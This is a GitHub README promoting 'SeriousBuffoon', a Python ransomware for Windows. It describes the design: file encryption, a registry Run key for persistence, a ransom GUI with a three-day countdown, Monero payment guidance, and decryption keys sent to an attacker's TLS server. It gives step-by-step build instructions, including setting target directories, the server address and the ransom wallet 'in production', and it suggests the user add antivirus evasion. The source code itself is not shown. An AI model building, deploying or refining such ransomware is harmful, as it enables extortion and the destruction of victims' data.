⚡⚡ SeriousBuffoon ⚡⚡ 

<img src="https://github.com/Chibraax/SeriousBuf00n/blob/main/Bin/GUI/images/joker.png" alt="Serious Buffoon" width="20" height="30">



Probably the best Python ransomware available on Github

 

< Features of SeriousBuffoon > 

	+> 32 bits encryption key
	+> Multi threaded encryption/decryption
	+> Encrypt big files chunk by chunk 
	+> Can adapt depending of the processor
	+> Send decryption key through TLS
	+> Awesome GUI write with Tkinter with useful options
	+> Unique ID for each victim 
	+> Victim can decrypt one file for free, to create a relationship of trust with the user 
	+> The decryption key for the free file is different from the rest of files
	+> Change the wallpapper and get back the old one after the decryption
	+> GUI with Timer of 3 days
	+> Easily customisable because with "const.py"
	+> Create register KEY for launch the ransomware at every start up
	+> Clean itself, the ransomware delete all files after the decryption
	+> Tell the user how to buy moneros 
	+> Works on Windows 10 and Windows 11

< How SeriousBuffoon works ? > 

[-] The "const.py" file:

This file contains ALL constant useful for the ransomware.

Server IP, images/ico path, path to hit... everything is there.
So you can customisable easily the behaving of SeriousBuffoon.

SeriousBuffoon is divided by 5 classes :
	+> Begin
	+> Persistence
	+> RansomWare
	+> GUI
	+> Clean

[-] Begin: 

Set up all the requierements for the good execution of SeriousBuffoon. 

	1) Create the directorie where will be stored our files (C:\Users\the_user\AppData\test) 
	2) Scrap the value of the Monero from 'https://www.coingecko.com/' and save it into a file
	3) Get the path of the wallpapper and save it into a file
	4) Generate and store the Identification Key

[-] Persistence:

	Allow SeriousBuffoon to launch at every start up.

	1) Create a register key into Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run named 'main'

[-] RansomWare:

		The librairie used for encryption is "cryptography" (https://cryptography.io/en/latest/).
		This ransomware was test on a 35go file and the encryption/decryption was successfully.
		
	+> Start to enumerates all file to encrypt (the DIR_TO_HIT const) define where the ransomware should encrypt
	+> Divise files into 2 list. One for files < 80MB and the other one for files > 80MB. 
	+> Generate a decryption key for the free file different from the main decryption key
	+> Start decrypt files < 80MB 
	+> Then files > 80MB
	+> For files > 80MB, the files is chunked into 6MB 
	+> The multi threading features allow the ransomware to create the same numbers of threads that amount of cpu cores.


[-] GUI : 

	The GUI make this ransomware unique and inform the user of different things. 

	+> GUI is made with Tkinter
	+> Countdown of 3 days start at the first launch of the ransomware
	+> There is 3 tab:
		+> How Buy Moneros ? Help the user to buy moneros
		+> Decrypt One file for free. Allow the user to decrypt one file for free
		+> Decrypt your files. Ask the decryption key to decrypt all files on the system
	+> Features to copy on the clipboard the monero address and the identification key
	+> Change the wallpapper by a creapy buffoon
	+> Write a README.txt on the desktop, inform the user to follow every instructions for get the decryption key


[-] Clean :

	Cleanup the actions of the ransomware.

	+> Delete the ransomware folder
	+> Put back the old wallpapper
	+> Delete the register key
	+> Kill all ransomware process



!!! Be careful if you change variable name, it will probably cause some errors !!!
!!! Do not moove or rename files !!!

I do not guarantee you the .exe will bypass any antivirus or Windows Defender, it's up to you to make some AV evasion.

Get confortable with the ransomware before use it, play with it, read the code etc...
When you "play" with the ransomware set "debug=True" and "console=True" in the build.spec, to make easier the debugging.


< How to use SeriousBuffoon as .exe > 

[-] Python 3.12.1+

[-] Set up the server: 

	+> Execute the "auto_cert_gen.sh" file for generate your certificate and key
	+> Edit server.py and the variables "keyfile" and "certificate" by setting the path of these files
	+> Edit your IP and PORT 
	+> Run the server by taping python3 server.py . (Maybe you will need to install termcolor (pip3 install termcolor))

[-] Set up the virtual environment and install all the required packages. 

	Step 1 : cd SeriousBuffoon/Bin
	Step 2 : py -m venv .venv
	Step 3 : activate the virtual env by taping :".\.venv\Scripts\activate" 
	Step 4 : install of packages by taping : pip3 install -r ..\ressource\requierements.txt
	Step 5 : Edit the const.py file and the variable : "DIR_TO_HIT" to set where SeriousBuffoon should encrypt
	Step 6 : Edit the const.py file and the variable : HOST,PORT to set your server and port
	Step 7 : Compile the ransomware by type : pyinstaller build.spec
	Step 8 : you will find the .exe in "dist" folder
	Step 9 : Enjoy <3



[-] If when you try to change the .ico of the .exe it's not working :

	- Try to just cut the file and past it to another dir
	- Go to C:\Users\User\AppData\Local\Microsoft\Windows\Explorer. Select all files that begin with iconcache and thumbcache and delete all these files
	- Go to C:\Users\user\AppData\Local and delete IconCache.db


[-] In production dont forget to edit the EMAIL and MONERO_ADDRESS in const.py.
[-] Add some files extensions on encryption/encrypt.py line 26.
[-] You can modify the build.spec if you want change the behaviour of the ransomware
